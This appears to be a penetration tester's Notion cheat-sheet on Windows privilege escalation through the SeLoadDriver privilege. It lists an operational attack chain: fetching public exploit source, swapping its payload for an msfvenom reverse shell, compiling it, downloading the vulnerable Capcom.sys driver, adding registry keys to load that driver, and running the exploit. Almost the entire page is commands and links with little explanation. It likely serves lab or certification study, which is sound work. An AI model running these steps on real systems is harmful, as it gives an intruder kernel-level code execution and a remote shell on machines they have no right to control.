# Enable SeLoadDriver Privilege

OS: Windows
Description: DriverView Tool/Capcom.sys
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

### Enable SeLoadDriver Privilege UAC

```jsx
https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
```

- We can replace line 292 to load revshell.exe from msfvenom if we like
    - replace "`C:\\Windows\\system32\\cmd.exe`" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe
- From Visual Studio 2019, compile it

```jsx
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

- Download capcom.sys driver
- save to c:\Tools

```jsx
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
```

- Add Registry Keys

```jsx
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

- We can use this driverview tool to see which drivers are loaded

```jsx
https://www.nirsoft.net/utils/driverview.html
```

```jsx
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

- Run the compiled binary and pray to God

```jsx
EnableSeLoadDriverPrivilege.exe
```